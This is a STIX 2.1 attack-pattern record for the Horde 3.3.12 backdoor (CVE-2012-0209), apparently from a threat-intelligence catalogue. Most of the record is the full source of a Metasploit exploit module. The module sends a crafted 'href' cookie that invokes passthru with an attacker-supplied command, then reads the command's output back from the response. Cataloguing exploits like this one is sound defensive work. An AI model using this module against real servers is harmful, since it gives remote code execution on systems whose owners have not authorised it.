{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d1e43de1-d4c0-4f77-859e-88684891d5bc",
    "created": "2024-08-14T17:11:34.019648Z",
    "modified": "2024-08-14T17:11:34.019652Z",
    "name": "Horde 3.3.12 Backdoor Arbitrary PHP Code Execution",
    "description": " This module exploits an arbitrary PHP code execution vulnerability introduced as a backdoor into Horde 3.3.12 and Horde Groupware 1.2.10. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/horde_href_backdoor.rb",
            "external_id": "horde_href_backdoor.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0209"
        },
        {
            "source_name": "reference",
            "url": "http://dev.horde.org/h/jonah/stories/view.php?channel_id=1&id=155"
        },
        {
            "source_name": "reference",
            "url": "http://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Horde 3.3.12 Backdoor Arbitrary PHP Code Execution',\n      'Description'    => %q{\n          This module exploits an arbitrary PHP code execution vulnerability introduced\n        as a backdoor into Horde 3.3.12 and Horde Groupware 1.2.10.\n      },\n      'Author'         => [\n        'Eric Romang',  # first public PoC\n        'jduck'         # Metasploit module\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-0209'],\n          [ 'OSVDB', '79246'],\n          [ 'EDB', '18492'],\n          [ 'URL', 'http://dev.horde.org/h/jonah/stories/view.php?channel_id=1&id=155' ],\n          [ 'URL', 'http://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/' ]\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x0a\\x0d\",\n          'DisableNops' => true,\n          'Space'       => 4096,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n            }\n        },\n      'Platform'       => %w{ linux unix },\n      'Arch'           => ARCH_CMD,\n      'DefaultTarget'  => 0,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2012-02-13'\n      ))\n\n      register_options(\n        [\n          OptString.new('URI', [true, \"Path to Horde installation\", \"/horde\"]),\n          OptString.new('APP', [true, \"App parameter required by javascript.php (must be active)\", \"horde\"]),\n        ])\n  end\n\n  def exploit\n    # Make sure the URI begins with a slash\n    uri = datastore['URI']\n\n    function = \"passthru\"\n    key = Rex::Text.rand_text_alpha(6)\n    arguments = \"echo #{key}`\"+payload.raw+\"`#{key}\"\n\n    res = send_request_cgi({\n      'uri'     => normalize_uri(uri, \"/services/javascript.php\"),\n      'method'  => 'POST',\n      'ctype'   => 'application/x-www-form-urlencoded',\n      'data'    => \"app=\"+datastore['APP']+\"&file=open_calendar.js\",\n      'headers' =>\n      {\n        'Cookie' => \"href=\"+function+\":\"+arguments,\n        'Connection' => 'Close',\n      }\n    }) #default timeout, we don't care about the response\n\n    if not res\n      fail_with(Failure::NotFound, 'The server did not respond to our request')\n    end\n\n    resp = res.body.split(key)\n    if resp and resp[1]\n      print_status(resp[1])\n    else\n      print_error(\"No response found\")\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-02-13",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}